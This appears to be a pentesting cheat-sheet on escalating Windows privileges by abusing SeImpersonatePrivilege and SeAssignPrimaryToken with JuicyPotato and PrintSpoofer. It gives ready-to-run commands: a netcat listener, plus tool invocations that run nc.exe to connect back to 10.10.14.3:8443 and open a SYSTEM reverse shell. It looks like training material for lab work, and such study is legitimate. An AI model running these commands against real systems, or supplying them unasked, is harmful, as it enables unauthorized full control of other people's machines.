# SeImpersonatePrivilege and SeAssignPrimaryToken

## **Privilege Escalation via SeImpersonatePrivilege and SeAssignPrimaryToken**



#### **Understanding SeImpersonatePrivilege**

* **SeImpersonatePrivilege** is a Windows security setting granted by default to the local **Administrators** group and the **Local Service** account. It allows certain programs to impersonate users or specified accounts, enabling the program to execute tasks on behalf of those users.
* **Key Command:**
  * `whoami /priv` → If this command shows **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**, you can exploit it to impersonate a privileged account, such as `NT AUTHORITY\SYSTEM`.

## **Exploiting SeImpersonatePrivilege**

Several tools and techniques exploit **SeImpersonatePrivilege** and **SeAssignPrimaryTokenPrivilege** to escalate privileges to SYSTEM or Administrator. Here are two primary tools:

### **1. JuicyPotato Exploit**

**JuicyPotato** is an exploit tool that abuses **SeImpersonate** or **SeAssignPrimaryToken** privileges via **DCOM/NTLM reflection** attacks. It works on Windows versions up to Server 2016 and Windows 10 build 1809 (it does **not** work on Server 2019 or newer Windows 10 versions).

**Steps to Exploit Using JuicyPotato:**

1.  **Set up a Netcat listener** on your attacking machine:

    ```yaml
    nc -lnvp 8443
    ```
2.  **Run JuicyPotato** on the target:

    ```swift
    c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
    ```

    **Explanation:**

    * `-l` → Specifies the COM server listening port (53375 in this case).
    * `-p` → Program to launch (in this case, `cmd.exe`).
    * `-a` → Argument passed to `cmd.exe`. Here, it instructs Netcat to connect to the attacker's machine and provide a reverse shell.
    * `-t` → Specifies the `createprocess` call, using either **CreateProcessWithTokenW** or **CreateProcessAsUser** functions, which require **SeImpersonate** or **SeAssignPrimaryToken** privileges.

### **2. PrintSpoofer and RoguePotato**

On newer versions of Windows where JuicyPotato doesn't work (Windows 10 build 1809 and beyond, and Server 2019), tools like **PrintSpoofer** and **RoguePotato** can be used to exploit **SeImpersonatePrivilege**.

**PrintSpoofer:**

**PrintSpoofer** is a tool that abuses the **SeImpersonatePrivilege** through the print spooler service to escalate to SYSTEM.

**Steps to Exploit Using PrintSpoofer:**

1.  **Run PrintSpoofer**:

    ```swift
    c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
    ```

    **Explanation:**

    * `-c` → Specifies the command to execute once the privilege escalation is successful. In this case, it is running Netcat (`nc.exe`) to provide a reverse shell to the attacker's machine.

***

#### **Note:**

* **JuicyPotato** is effective on older Windows versions (Windows Server 2016 and below), but it no longer works on Windows Server 2019 and Windows 10 build 1809 onwards.
* For newer systems, alternatives like **RoguePotato** or **PrintSpoofer** are more appropriate for exploiting **SeImpersonatePrivilege**.
